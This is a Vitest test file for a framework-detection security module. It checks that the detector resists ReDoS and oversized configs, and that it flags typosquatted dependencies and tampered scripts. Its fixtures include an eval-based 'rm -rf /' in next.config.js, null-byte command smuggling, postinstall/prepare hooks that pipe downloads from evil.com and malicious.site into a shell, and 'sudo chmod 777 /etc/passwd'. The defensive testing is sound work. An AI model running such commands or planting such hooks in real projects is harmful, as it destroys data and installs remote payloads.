/**
 * Task 1.1.3 Framework Security Vulnerability Analysis
 * Comprehensive security vulnerability testing and validation
 */

import { mkdir, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import {
  DANGEROUS_SCRIPT_PATTERNS,
  detectFrameworkSecurely,
  SUSPICIOUS_DEPENDENCY_PATTERNS,
} from '../../../core/foundation/security/framework.js';

describe('Task 1.1.3 Framework Security Vulnerability Analysis', () => {
  let testDir: string;

  beforeEach(async () => {
    // Create a more isolated temporary directory with process ID and unique random string
    const uniqueId = `vuln-test-${process.pid}-${Date.now()}-${Math.random().toString(36).substr(2, 12)}`;
    testDir = join(tmpdir(), uniqueId);
    await mkdir(testDir, { recursive: true });
  });

  afterEach(async () => {
    try {
      await rm(testDir, { recursive: true });
    } catch {}
  });

  describe('1. ReDoS (Regular Expression Denial of Service) Vulnerabilities', () => {
    it('should handle pathological regex inputs without timeout', () => {
      // Test DANGEROUS_SCRIPT_PATTERNS for ReDoS
      const pathologicalInputs = [
        // Nested quantifiers that could cause exponential backtracking
        `sudo ${'a'.repeat(10000)}`,
        `rm -rf${' '.repeat(5000)}/`,
        `chmod 777${' '.repeat(5000)}file`,
        `eval(${')'.repeat(5000)}`,
        `nohup${' '.repeat(5000)}&`,
      ];

      pathologicalInputs.forEach((input) => {
        const start = Date.now();

        // Test all dangerous script patterns
        DANGEROUS_SCRIPT_PATTERNS.forEach((pattern) => {
          pattern.test(input);
        });

        const duration = Date.now() - start;
        expect(duration).toBeLessThan(1000); // Should complete within 1 second
      });
    });

    it('should handle catastrophic backtracking in suspicious dependency patterns', () => {
      const maliciousInputs = [
        'a'.repeat(10000), // Long string
        '1a2b3c4d5e'.repeat(1000), // Pattern: /[0-9]+[a-z]+[0-9]+/
        `evil-${'x'.repeat(5000)}`, // Pattern: /^evil-|^malicious-|^hack-/i
        `backdoor${'x'.repeat(5000)}`, // Pattern: /backdoor|trojan|virus|malware/i
      ];

      maliciousInputs.forEach((input) => {
        const start = Date.now();

        SUSPICIOUS_DEPENDENCY_PATTERNS.forEach((pattern) => {
          pattern.test(input);
        });

        const duration = Date.now() - start;
        expect(duration).toBeLessThan(500); // Fast pattern matching
      });
    });
  });

  describe('2. Memory Exhaustion via Large Config Files', () => {
    it('should handle extremely large package.json without memory issues', async () => {
      // Create a package.json with massive dependencies object
      const largeDeps: Record<string, string> = {};
      for (let i = 0; i < 10000; i++) {
        largeDeps[`package-${i}-${'x'.repeat(100)}`] = '^1.0.0';
      }

      const largePackageJson = {
        name: 'large-project',
        dependencies: largeDeps,
        scripts: {},
      };

      await writeFile(join(testDir, 'package.json'), JSON.stringify(largePackageJson));

      // Should handle without memory exhaustion
      const result = await detectFrameworkSecurely(testDir);
      expect(result).toBeDefined();
    });

    it('should handle deeply nested config objects', async () => {
      // Create deeply nested configuration that could cause stack overflow
      let deepObject: any = { value: 'end' };
      for (let i = 0; i < 1000; i++) {
        deepObject = { nested: deepObject };
      }

      const maliciousPackage = {
        name: 'nested-project',
        config: deepObject,
        dependencies: { react: '^18.0.0' },
      };

      await writeFile(join(testDir, 'package.json'), JSON.stringify(maliciousPackage));

      // Should not crash from deeply nested objects
      const result = await detectFrameworkSecurely(testDir);
      expect(result).toBeDefined();
    });
  });

  describe('3. Configuration File Injection Vulnerabilities', () => {
    it('should detect JavaScript code injection in config files', async () => {
      // Malicious config with code injection
      const maliciousConfig = `
        /** @type {import('next').NextConfig} */
        const nextConfig = {
          webpack: (config) => {
            // Malicious code injection
            eval('require("child_process").exec("rm -rf /")');
            return config;
          }
        };
        module.exports = nextConfig;
      `;

      await writeFile(join(testDir, 'next.config.js'), maliciousConfig);
      await writeFile(
        join(testDir, 'package.json'),
        JSON.stringify({
          name: 'malicious-next',
          dependencies: { next: '^14.0.0' },
        })
      );

      const result = await detectFrameworkSecurely(testDir);

      // Should detect the malicious eval pattern
      expect(result?.security.isSecure).toBe(false);
      expect(result?.security.violations.some((v) => v.type === 'script-injection')).toBe(true);
    });

    it('should handle null byte injection in config paths', async () => {
      // Test null byte injection in file paths
      const maliciousPackage = {
        name: 'null-byte-project',
        dependencies: { next: '^14.0.0' },
        scripts: {
          build: `echo "test" > /tmp/test\0rm -rf /`,
        },
      };

      await writeFile(join(testDir, 'package.json'), JSON.stringify(maliciousPackage));

      const result = await detectFrameworkSecurely(testDir);

      // Should detect dangerous script patterns
      expect(result?.buildConfig.security.hasSafeCommands).toBe(false);
    });
  });

  describe('4. Dependency Confusion Attacks', () => {
    it('should detect typosquatting dependency patterns', async () => {
      const typosquattingPackage = {
        name: 'typosquat-project',
        dependencies: {
          reactt: '^18.0.0', // Typosquatting 'react'
          loadsh: '^4.17.0', // Typosquatting 'lodash'
          expresss: '^4.18.0', // Typosquatting 'express'
          'evil-react': '^1.0.0', // Malicious prefix
        },
      };

      await writeFile(join(testDir, 'package.json'), JSON.stringify(typosquattingPackage));

      const result = await detectFrameworkSecurely(testDir);

      // Should flag suspicious dependencies
      expect(result?.dependencies.security.hasSuspiciousDeps).toBe(true);
      expect(result?.dependencies.suspicious).toContain('evil-react');
    });

    it('should handle dependency names with dangerous characters', async () => {
      const dangerousPackage = {
        name: 'dangerous-deps',
        dependencies: {
          '../../../etc/passwd': '^1.0.0',
          'package\nwith\nnewlines': '^1.0.0',
          'package with spaces': '^1.0.0',
        },
      };

      await writeFile(join(testDir, 'package.json'), JSON.stringify(dangerousPackage));

      const result = await detectFrameworkSecurely(testDir);

      // Should handle dangerous dependency names gracefully
      expect(result).toBeDefined();
    });
  });

  describe('5. Race Condition Vulnerabilities', () => {
    it('should handle concurrent detection calls safely', async () => {
      // Create a valid project
      await writeFile(
        join(testDir, 'package.json'),
        JSON.stringify({
          name: 'concurrent-test',
          dependencies: { react: '^18.0.0' },
        })
      );

      // Run multiple concurrent detection calls
      const promises = Array(10)
        .fill(0)
        .map(() => detectFrameworkSecurely(testDir));

      const results = await Promise.all(promises);

      // All should return consistent results
      results.forEach((result) => {
        expect(result?.name).toBeDefined();
        expect(result?.dependencies.trusted).toContain('react');
      });
    });

    it('should handle file system race conditions', async () => {
      // Create package.json
      await writeFile(
        join(testDir, 'package.json'),
        JSON.stringify({
          name: 'race-test',
          dependencies: { next: '^14.0.0' },
        })
      );

      // Start framework detection
      const detectionPromise = detectFrameworkSecurely(testDir);

      // Simultaneously modify the file
      setTimeout(async () => {
        try {
          await writeFile(
            join(testDir, 'package.json'),
            JSON.stringify({
              name: 'modified-race-test',
              dependencies: { vue: '^3.0.0' },
            })
          );
        } catch {}
      }, 10);

      // Should handle gracefully without crashing
      const result = await detectionPromise;
      expect(result).toBeDefined();
    });
  });

  describe('6. Configuration Tampering Detection', () => {
    it('should detect suspicious script modifications', async () => {
      // Small delay to ensure previous test's setTimeout operations have completed
      await new Promise((resolve) => setTimeout(resolve, 50));

      const tamperedPackage = {
        name: 'tampered-project',
        dependencies: { next: '^14.0.0' },
        scripts: {
          // Legitimate looking but dangerous
          postinstall: 'node scripts/setup.js && curl -s https://evil.com/malware.sh | bash',
          prepare: 'husky install && wget -qO- https://malicious.site/backdoor | sh',
          build: 'next build && sudo chmod 777 /etc/passwd',
        },
      };

      await writeFile(join(testDir, 'package.json'), JSON.stringify(tamperedPackage));

      const result = await detectFrameworkSecurely(testDir);

      // Should detect multiple dangerous patterns
      expect(result).toBeDefined();
      expect(result?.buildConfig).toBeDefined();
      expect(result?.buildConfig?.security).toBeDefined();
      expect(result?.buildConfig.security.hasSafeCommands).toBe(false);
      expect(result?.buildConfig.security.suspiciousScripts.length).toBeGreaterThan(0);
      expect(result?.buildConfig.security.privilegeEscalation.length).toBeGreaterThan(0);
    });
  });
});
